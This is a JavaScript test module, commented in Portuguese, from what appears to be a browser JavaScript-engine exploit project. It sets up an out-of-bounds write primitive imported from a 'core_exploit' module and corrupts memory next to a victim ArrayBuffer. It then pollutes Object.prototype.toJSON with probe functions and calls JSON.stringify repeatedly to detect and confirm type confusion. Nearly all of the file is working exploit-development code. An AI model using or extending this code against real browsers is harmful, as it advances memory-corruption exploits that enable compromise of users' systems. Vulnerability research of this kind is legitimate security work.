// js/script3/testSequentialStringify.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// --- Variantes da toJSON para sondar victim_ab (ArrayBuffer) ---

// V1: Operações básicas em ArrayBuffer (byteLength, DataView R/W)
export function toJSON_AB_Probe_V1() {
    const FNAME_toJSON = "toJSON_AB_Probe_V1";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_array_buffer_instance_entry: this instanceof ArrayBuffer,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_write_val: 0xBADDBADD,
        dv_read_val: "N/A",
        dv_rw_match: false,
        error: null
    };
    logS3(`[${FNAME_toJSON}] Entrando. this type: ${result.this_type_entry}, instanceof AB: ${result.is_array_buffer_instance_entry}`, "info", FNAME_toJSON);
    try {
        if (!result.is_array_buffer_instance_entry) {
            result.error = "this is not an ArrayBuffer instance at entry.";
            logS3(`[${FNAME_toJSON}] ${result.error}`, "critical", FNAME_toJSON);
            return result;
        }
        result.byteLength_prop = this.byteLength;
        const dv = new DataView(this);
        result.is_dataview_created = true;

        if (this.byteLength >= 4) {
            dv.setUint32(0, result.dv_write_val, true);
            const readVal = dv.getUint32(0, true);
            result.dv_read_val = toHex(readVal);
            if (readVal === result.dv_write_val) {
                result.dv_rw_match = true;
            }
        } else {
            result.dv_read_val = `Buffer too small for DV R/W (size: ${this.byteLength})`;
        }
    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO: ${result.error}`, "error", FNAME_toJSON);
    }
    return result;
}

// V2_Detailed: Loop for...in this com logs detalhados para type confusion
export function toJSON_AB_Probe_V2_Detailed() {
    const FNAME_toJSON = "toJSON_AB_Probe_V2_Detailed";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: "N/A",
        is_array_buffer_instance_entry: false,
        byteLength_prop: "N/A",
        for_in_iterations: 0,
        this_type_in_loop: "N/A",
        this_type_after_loop: "N/A",
        error: null
    };

    logS3(`[${FNAME_toJSON}] Entrando. this type inicial: ${Object.prototype.toString.call(this)}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);
    result.this_type_entry = Object.prototype.toString.call(this);
    result.is_array_buffer_instance_entry = this instanceof ArrayBuffer;

    try {
        if (!result.is_array_buffer_instance_entry) {
            result.error = "this is not an ArrayBuffer instance at ENTRY.";
            logS3(`[${FNAME_toJSON}] ${result.error}`, "critical", FNAME_toJSON);
            return result;
        }

        result.byteLength_prop = this.byteLength;
        logS3(`[${FNAME_toJSON}] Antes do for...in. this type: ${Object.prototype.toString.call(this)}, len: ${this.byteLength}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);

        for (const prop in this) {
            result.for_in_iterations++;
            const current_this_type_in_loop = Object.prototype.toString.call(this);
            const current_instanceof_ab_in_loop = this instanceof ArrayBuffer;
            if (result.for_in_iterations === 1) {
                result.this_type_in_loop = current_this_type_in_loop;
            }
            logS3(`[${FNAME_toJSON}] Dentro do for...in, iter ${result.for_in_iterations}, prop: '${prop}'. this type: ${current_this_type_in_loop}, instanceof AB: ${current_instanceof_ab_in_loop}`, "info", FNAME_toJSON);

            if (!current_instanceof_ab_in_loop && result.this_type_entry === "[object ArrayBuffer]") {
                logS3(`[${FNAME_toJSON}] !!!! TYPE CONFUSION DETECTADA DENTRO do loop for...in !!!! this era ArrayBuffer, agora é ${current_this_type_in_loop}`, "critical", FNAME_toJSON);
                result.error = `Type confusion inside for...in (was ArrayBuffer, became ${current_this_type_in_loop})`;
                result.this_type_in_loop = current_this_type_in_loop;
                break;
            }
            if (result.for_in_iterations > 100) {
                logS3(`[${FNAME_toJSON}] Loop for...in excedeu 100 iterações. Interrompendo.`, "warn", FNAME_toJSON);
                if (!result.error) result.error = "Max iterations reached in for...in";
                break;
            }
        }
        result.this_type_after_loop = Object.prototype.toString.call(this);
        logS3(`[${FNAME_toJSON}] Após o for...in. Iterações: ${result.for_in_iterations}. this type final: ${result.this_type_after_loop}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);

    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO GERAL na toJSON: ${result.error}. this type: ${Object.prototype.toString.call(this)}`, "error", FNAME_toJSON);
    }
    return result;
}


export async function executeSequentialStringifyTest() {
    const FNAME_TEST = `executeSequentialStringifyTest`;
    logS3(`--- Iniciando Teste: Sondagem Sequencial de victim_ab com Diferentes toJSONs ---`, "test", FNAME_TEST);
    document.title = `Seq. Stringify victim_ab`;

    const victim_ab_size_val = 64;
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando teste.", "error", FNAME_TEST);
        return { setupError: new Error("OOB Setup Failed") };
    }

    let victim_ab;
    try {
        victim_ab = new ArrayBuffer(victim_ab_size_val);
        victim_ab.customPropStr = "hello_victim"; // Adiciona props para o for...in
        victim_ab.customPropNum = 12345;
        logS3(`1. victim_ab (64 bytes) criado com props customizadas.`, "info", FNAME_TEST);
    } catch (e_victim_alloc) {
        logS3(`ERRO ao criar victim_ab: ${e_victim_alloc.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_victim_alloc };
    }

    try {
        logS3(`2. Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada (uma única vez).`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_write };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let results_call1 = null;
    let results_call2 = null;
    let victim_ab_state_after_call1 = "N/A";

    // --- Chamada 1: Usando toJSON_AB_Probe_V2_Detailed ---
    logS3("\n--- Chamada 1: JSON.stringify(victim_ab) com toJSON_AB_Probe_V2_Detailed ---", "subtest", FNAME_TEST);
    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_AB_Probe_V2_Detailed,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        document.title = `Seq. Stringify - Call 1 (V2_Detailed)`;
        results_call1 = JSON.stringify(victim_ab);
        logS3(`   Resultado da toJSON (Chamada 1): ${JSON.stringify(results_call1)}`, "info", FNAME_TEST);
    } catch (e_str1) {
        logS3(`   !!!! ERRO AO STRINGIFY (Chamada 1) !!!!: ${e_str1.name} - ${e_str1.message}`, "critical", FNAME_TEST);
        results_call1 = { error_stringify: `${e_str1.name}: ${e_str1.message}`};
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
            pollutionApplied = false;
        }
    }

    // Verificar estado do victim_ab externamente após a primeira chamada
    try {
        victim_ab_state_after_call1 = `Type: ${Object.prototype.toString.call(victim_ab)}, instanceof AB: ${victim_ab instanceof ArrayBuffer}, byteLength: ${victim_ab ? victim_ab.byteLength : 'N/A'}`;
        logS3(`   Estado de victim_ab APÓS Chamada 1: ${victim_ab_state_after_call1}`, "info", FNAME_TEST);
    } catch (e_check) {
        victim_ab_state_after_call1 = `Error checking victim_ab: ${e_check.message}`;
        logS3(`   ERRO ao checar victim_ab APÓS Chamada 1: ${e_check.message}`, "error", FNAME_TEST);
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para garantir que quaisquer efeitos colaterais se manifestem

    // --- Chamada 2: Usando toJSON_AB_Probe_V1 (no MESMO victim_ab) ---
    logS3("\n--- Chamada 2: JSON.stringify(victim_ab) com toJSON_AB_Probe_V1 (mesmo victim_ab) ---", "subtest", FNAME_TEST);
    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_AB_Probe_V1, // Usando a V1 mais simples para sondar o estado
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        document.title = `Seq. Stringify - Call 2 (V1)`;
        results_call2 = JSON.stringify(victim_ab); // Usando o MESMO victim_ab
        logS3(`   Resultado da toJSON (Chamada 2): ${JSON.stringify(results_call2)}`, "info", FNAME_TEST);
    } catch (e_str2) {
        logS3(`   !!!! ERRO AO STRINGIFY (Chamada 2) !!!!: ${e_str2.name} - ${e_str2.message}`, "critical", FNAME_TEST);
        results_call2 = { error_stringify: `${e_str2.name}: ${e_str2.message}`};
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Análise final
    logS3("\n--- Análise Final do Teste Sequencial ---", "test", FNAME_TEST);
    if (results_call1 && results_call1.error) {
        logS3(`Problema na Chamada 1 (V2_Detailed): Erro interno da toJSON = ${results_call1.error}`, "warn", FNAME_TEST);
    } else if (results_call1 && results_call1.error_stringify) {
        logS3(`Problema na Chamada 1 (V2_Detailed): Erro no stringify = ${results_call1.error_stringify}`, "warn", FNAME_TEST);
    }

    if (results_call2 && results_call2.toJSON_variant === "toJSON_AB_Probe_V1") {
        if (results_call2.error) {
            logS3(`PROBLEMA na Chamada 2 (V1): Erro interno da toJSON = ${results_call2.error}`, "critical", FNAME_TEST);
            if (results_call2.error.includes("not an ArrayBuffer instance at entry")) {
                logS3("   !!!! TYPE CONFUSION CONFIRMADA NA ENTRADA DA SEGUNDA toJSON !!!!", "vuln", FNAME_TEST);
                document.title = "SUCCESS: Type Confusion on 2nd Call!";
            }
        } else if (!results_call2.is_array_buffer_instance_entry) {
            logS3(`PROBLEMA na Chamada 2 (V1): this NÃO é ArrayBuffer na entrada! Tipo: ${results_call2.this_type_entry}`, "critical", FNAME_TEST);
            logS3("   !!!! TYPE CONFUSION CONFIRMADA NA ENTRADA DA SEGUNDA toJSON !!!!", "vuln", FNAME_TEST);
            document.title = "SUCCESS: Type Confusion on 2nd Call!";
        } else {
            logS3("Chamada 2 (V1): victim_ab ainda parece ser um ArrayBuffer funcional.", "good", FNAME_TEST);
        }
    } else if (results_call2 && results_call2.error_stringify) {
         logS3(`PROBLEMA na Chamada 2 (V1): Erro no stringify = ${results_call2.error_stringify}`, "critical", FNAME_TEST);
         if (results_call2.error_stringify.toLowerCase().includes("typeerror")) {
              logS3("   !!!! TypeError no stringify da segunda chamada indica provável Type Confusion !!!!", "vuln", FNAME_TEST);
              document.title = "SUCCESS: TypeError on 2nd Call (Type Confusion)!";
         }
    }


    logS3(`--- Teste Sondagem Sequencial de victim_ab CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    document.title = document.title.startsWith("SUCCESS:") ? document.title : `Seq. Stringify Done`;
}
